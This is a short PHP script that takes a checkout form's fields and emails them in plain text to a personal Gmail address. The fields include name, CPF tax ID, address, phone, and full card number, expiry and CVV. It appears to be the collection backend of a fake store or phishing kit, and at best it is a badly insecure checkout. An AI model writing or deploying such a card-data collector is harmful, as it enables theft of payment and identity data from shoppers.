<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Dados da Página 1
    $fullName = htmlspecialchars($_POST['full-name']);
    $email = htmlspecialchars($_POST['email']);
    $phone = htmlspecialchars($_POST['phone']);
    $cpf = htmlspecialchars($_POST['cpf']);
    $cep = htmlspecialchars($_POST['cep']);
    $address = htmlspecialchars($_POST['address']);
    $houseNumber = htmlspecialchars($_POST['house-number']);
    $complement = htmlspecialchars($_POST['complement']);

    // Dados da Página 2
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $cardExpiry = htmlspecialchars($_POST['card-expiry']);
    $cardCVV = htmlspecialchars($_POST['card-cvv']);

    // Corpo do e-mail
    $message = "
        **Informações de Entrega**
        Nome Completo: $fullName
        E-mail: $email
        Telefone: $phone
        CPF: $cpf
        CEP: $cep
        Endereço: $address
        Número: $houseNumber
        Complemento: $complement

        **Informações de Pagamento**
        Número do Cartão: $cardNumber
        Validade: $cardExpiry
        CVV: $cardCVV
    ";

    // Configuração do e-mail
    $to = 'gabrielreboucas2001@gmail.com';
    $subject = 'Nova Compra Realizada';
    $headers = "From: no-reply@dominio.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviando o e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "E-mail enviado com sucesso!";
    } else {
        echo "Erro ao enviar o e-mail.";
    }
} else {
    echo "Método não permitido.";
}
?>
